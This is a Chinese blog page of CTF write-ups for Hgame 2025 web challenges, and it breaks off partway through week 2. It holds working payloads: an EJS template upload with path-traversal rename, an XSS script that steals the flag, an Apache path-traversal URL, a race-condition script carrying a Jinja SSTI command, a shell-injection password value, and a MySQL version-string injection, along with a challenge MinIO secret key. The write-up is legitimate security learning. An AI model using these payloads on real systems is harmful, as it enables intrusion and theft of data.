@@ -1,0 +1,885 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/biaotou.png">
+  <link rel="icon" href="/img/biaotou.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="orange">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Week1  web  Level 24 Pacman 直接去找源码，控制台赋值 12_SCORE&#x3D;100000_LIFE&#x3D;true; 得到之后进行base64,栅栏密码解密  Level 47 BandBomb 1234上传恶意EJS文件   创建一个包含EJS代码的文件，内容为读取flag的代码：aaa.ejs   &lt;%&#x3D; process.env.FLAG || require(&amp;#x">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hgame2025-web">
+<meta property="og:url" content="https://0ran9ewww.github.io/2025/02/22/Hgame/Hgame2025/index.html">
+<meta property="og:site_name" content="0raN9e的笔记">
+<meta property="og:description" content="Week1  web  Level 24 Pacman 直接去找源码，控制台赋值 12_SCORE&#x3D;100000_LIFE&#x3D;true; 得到之后进行base64,栅栏密码解密  Level 47 BandBomb 1234上传恶意EJS文件   创建一个包含EJS代码的文件，内容为读取flag的代码：aaa.ejs   &lt;%&#x3D; process.env.FLAG || require(&amp;#x">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/Hgame/2025-02-22163358.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/Hgame/2025-02-22180854.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/Hgame/2025-02-22193119.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/Hgame/2025-02-22193559.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/Hgame/2025-02-22203924.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/Hgame/2025-02-22211012.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/Hgame/2025-02-22140449.png">
+<meta property="article:published_time" content="2025-02-21T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-02-22T13:19:06.830Z">
+<meta property="article:author" content="orange">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://0ran9ewww.github.io/images/Hgame/2025-02-22163358.png">
+  
+  
+  
+  <title>Hgame2025-web - 0raN9e的笔记</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"0ran9ewww.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"mhU37D1jfBAPsc6SNIXmdLb0-gzGzoHsz","app_key":"z8mFsDgOSQqDw1luWGGbCaCR","server_url":"https://mhu37d1j.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>0raN9e的blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Hgame2025-web"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-02-22 00:00" pubdate>
+          2025年2月22日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          31 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Hgame2025-web</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年2月22日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="week1"><a class="markdownIt-Anchor" href="#week1"></a> Week1</h1>
+<h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> web</h2>
+<h3 id="level-24-pacman"><a class="markdownIt-Anchor" href="#level-24-pacman"></a> Level 24 Pacman</h3>
+<p>直接去找源码，控制台赋值</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">_SCORE</span>=<span class="hljs-number">100000</span><br><span class="hljs-attr">_LIFE</span>=<span class="hljs-literal">true</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+<p>得到之后进行base64,栅栏密码解密</p>
+<h3 id="level-47-bandbomb"><a class="markdownIt-Anchor" href="#level-47-bandbomb"></a> Level 47 BandBomb</h3>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mel">上传恶意EJS文件<br>   创建一个包含EJS代码的文件，内容为读取flag的代码：<br>aaa.ejs<br>   &lt;%= process.<span class="hljs-keyword">env</span>.FLAG || require(<span class="hljs-string">&#x27;fs&#x27;</span>).readFileSync(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>) %&gt;<br></code></pre></td></tr></table></figure>
+<p>使用POST请求上传此文件到<code>/upload</code>接口。</p>
+<p>发送POST请求到<code>/rename</code>接口，将上传的文件重命名为<code>../views/mortis.ejs</code>：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;oldName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;aaa.ejs&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;newName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;../views/mortis.ejs&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+<p>这会将恶意模板覆盖到原模板文件。</p>
+<p>访问应用首页<code>/</code>，服务器渲染被覆盖的模板，执行其中的代码并显示flag。</p>
+<h3 id="mysterymessageboard"><a class="markdownIt-Anchor" href="#mysterymessageboard"></a> MysteryMessageBoard</h3>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>)</span><br><span class="language-javascript">        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">text</span>())</span><br><span class="language-javascript">        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">flag</span> =&gt;</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/&#x27;</span>, &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">headers</span>: &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;,</span><br><span class="language-javascript">                <span class="hljs-attr">body</span>: <span class="hljs-string">&quot;comment=&quot;</span> + flag</span><br><span class="language-javascript">            &#125;)</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>中间需要访问/admin再返回触发</p>
+<h3 id="level-25-双面人派对"><a class="markdownIt-Anchor" href="#level-25-双面人派对"></a> Level 25 双面人派对</h3>
+<p>minio,下载main文件看ida,upx脱壳后直接f12看字符得到密钥这些内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mc <span class="hljs-built_in">alias</span> <span class="hljs-built_in">set</span> myminio http://node1.hgame.vidar.club:32395 minio_admin JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=<br></code></pre></td></tr></table></figure>
+<p>然后下载hints里的src</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>	<span class="hljs-string">&quot;level25/fetch&quot;</span><br><br>	<span class="hljs-string">&quot;level25/conf&quot;</span><br><br>	<span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br>	<span class="hljs-string">&quot;github.com/jpillora/overseer&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>	fetcher := &amp;fetch.MinioFetcher&#123;<br>		Bucket:    conf.MinioBucket,<br>		Key:       conf.MinioKey,<br>		Endpoint:  conf.MinioEndpoint,<br>		AccessKey: conf.MinioAccessKey,<br>		SecretKey: conf.MinioSecretKey,<br>	&#125;<br>	overseer.Run(overseer.Config&#123;<br>		Program: program,<br>		Fetcher: fetcher,<br>	&#125;)<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">program</span><span class="hljs-params">(state overseer.State)</span></span> &#123;<br>	g := gin.Default()<br>	g.StaticFS(<span class="hljs-string">&quot;/&quot;</span>, gin.Dir(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-literal">true</span>))<br>	g.Run(<span class="hljs-string">&quot;:8080&quot;</span>)<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p>由代码得是热加载，直接目录映射，在linux环境进行编译打包上传</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mc <span class="hljs-built_in">cp</span> main myminio/prodbucket/update<br></code></pre></td></tr></table></figure>
+<h3 id="level-38475-角落"><a class="markdownIt-Anchor" href="#level-38475-角落"></a> Level 38475 角落</h3>
+<p>考察一个cve，apche的2024</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>node1.hgame.vidar.club:<span class="hljs-number">32126</span><span class="hljs-regexp">/admin/u</span>sr<span class="hljs-regexp">/local/</span>apache2<span class="hljs-regexp">/app/</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>f..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../u</span>sr<span class="hljs-regexp">/local/</span>apache2<span class="hljs-regexp">/app/</span>app.py%<span class="hljs-number">3</span>f<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, render_template_string, redirect<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> templates<br><br>app = Flask(__name__)<br>pwd = os.path.dirname(__file__)<br>show_msg = templates.show_msg<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readmsg</span>():<br>	filename = pwd + <span class="hljs-string">&quot;/tmp/message.txt&quot;</span><br>	<span class="hljs-keyword">if</span> os.path.exists(filename):<br>		f = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>)<br>		message = f.read()<br>		f.close()<br>		<span class="hljs-keyword">return</span> message<br>	<span class="hljs-keyword">else</span>:<br>		<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No message now.&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>	status = request.args.get(<span class="hljs-string">&#x27;status&#x27;</span>)<br>	<span class="hljs-keyword">if</span> status <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>		status = <span class="hljs-string">&#x27;&#x27;</span><br>	<span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, status=status)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/send&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_message</span>():<br>	filename = pwd + <span class="hljs-string">&quot;/tmp/message.txt&quot;</span><br>	message = request.form[<span class="hljs-string">&#x27;message&#x27;</span>]<br><br>	f = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;w&#x27;</span>)<br>	f.write(message) <br>	f.close()<br><br>	<span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;index?status=Send successfully!!&#x27;</span>)<br>	<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_message</span>():<br>	<span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#123;&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> readmsg():<br>		show = show_msg.replace(<span class="hljs-string">&quot;&#123;&#123;message&#125;&#125;&quot;</span>, readmsg())<br>		<span class="hljs-keyword">return</span> render_template_string(show)<br>	<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;waf!!&#x27;</span><br>	<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	app.run(host = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port = <span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure>
+<p>打个条件竞争</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://node1.hgame.vidar.club:32126/app&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_payload</span>():<br>    data = &#123;<br>        <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;&#123;&#123;config.__class__.__init__.__globals__[&quot;os&quot;].popen(&quot;cat /flag&quot;).read()&#125;&#125;&#x27;</span><br>    &#125;<br>    requests.post(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>/send&quot;</span>, data=data)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_message</span>():<br>    resp = requests.get(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>/read&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;waf!!&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> resp.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Success! Response: <span class="hljs-subst">&#123;resp.text&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    t1 = threading.Thread(target=send_payload)<br>    t2 = threading.Thread(target=read_message)<br><br>    t1.start()<br>    time.sleep(<span class="hljs-number">0.01</span>)<br>    t2.start()<br><br>    t1.join()<br>    t2.join()<br><br>    time.sleep(<span class="hljs-number">0.1</span>)<br></code></pre></td></tr></table></figure>
+<h1 id="week2"><a class="markdownIt-Anchor" href="#week2"></a> week2</h1>
+<h2 id="web-2"><a class="markdownIt-Anchor" href="#web-2"></a> web</h2>
+<h3 id="level-21096-honeypot"><a class="markdownIt-Anchor" href="#level-21096-honeypot"></a> Level 21096 HoneyPot</h3>
+<p>非预期</p>
+<p>经过测试可以发现导入数据里面可以随便输入，输入密码的地方输入<code>; /writeflag;#</code>然后再访问<code>/flag</code>之后就可以得到flag</p>
+<h3 id="level-21096-honeypot_revenge"><a class="markdownIt-Anchor" href="#level-21096-honeypot_revenge"></a> Level 21096 HoneyPot_Revenge</h3>
+<p>是<code>CVE-2024-21096mysqldump</code></p>
+<p>大致思路就是自己用有漏洞版本的mysql，进行远程连接得到shell执行</p>
+<p>在 MySQL 命令行中，<code>\!</code> 用于执行外部命令，比如</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; \! mysql -u username -p database_name &lt; backup_file.sql<br></code></pre></td></tr></table></figure>
+<p>因此</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> apt-get install -y build-essential cmake bison libncurses5-dev libtirpc-dev libssl-dev pkg-config<br><span class="hljs-attribute">wget</span> https://dev.mysql.com/get/Downloads/MySQL-<span class="hljs-number">8</span>.<span class="hljs-number">0</span>/mysql-boost-<span class="hljs-number">8</span>.<span class="hljs-number">0</span>.<span class="hljs-number">34</span>.tar.gz<br><span class="hljs-attribute">tar</span> -zxvf mysql-boost-<span class="hljs-number">8</span>.<span class="hljs-number">0</span>.<span class="hljs-number">34</span>.tar.gz<br><span class="hljs-attribute">cd</span> mysql-<span class="hljs-number">8</span>.<span class="hljs-number">0</span>.<span class="hljs-number">34</span><br><span class="hljs-attribute">root</span>@dkcjbRCmYFsaLJs:~/mysql-<span class="hljs-number">8</span>.<span class="hljs-number">0</span>.<span class="hljs-number">34</span>/include# vim mysql_version.h.in<br><br><span class="hljs-comment">#define MYSQL_SERVER_VERSION       &quot;8.0.0-injection-test\n\\! /writeflag&quot;</span><br></code></pre></td></tr></table></figure>
+<p>然后进行编译(时间较长，浮现的时候可以干些其他的事)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> build<br><span class="hljs-built_in">cd</span> build<br>cmake .. -DDOWNLOAD_BOOST=1 -DWITH_BOOST=../boost<br>make -j$(<span class="hljs-built_in">nproc</span>) <br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> make install<br><span class="hljs-built_in">sudo</span> groupadd mysql<br><span class="hljs-built_in">sudo</span> useradd -r -g mysql -s /bin/false mysql<br><span class="hljs-built_in">sudo</span> /usr/local/mysql/bin/mysqld --initialize --user=mysql --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chown</span> -R mysql:mysql /usr/local/mysql<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chown</span> -R mysql:mysql /usr/local/mysql/data<br><span class="hljs-built_in">sudo</span> /usr/local/mysql/bin/mysqld_safe --user=mysql &amp;<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/local/mysql/bin/mysql -u root <br></code></pre></td></tr></table></figure>
+<p>自己重新设置一个密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">FLUSH PRIVILEGES;<br>ALTER USER <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> IDENTIFIED BY <span class="hljs-string">&#x27;123456&#x27;</span>;<br>FLUSH PRIVILEGES;<br>EXIT;<br></code></pre></td></tr></table></figure>
+<p>在cnf配置运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[mysqld]<br>bind-address = 0.0.0.0<br></code></pre></td></tr></table></figure>
+<p>为了安全起见创建一个用户</p>
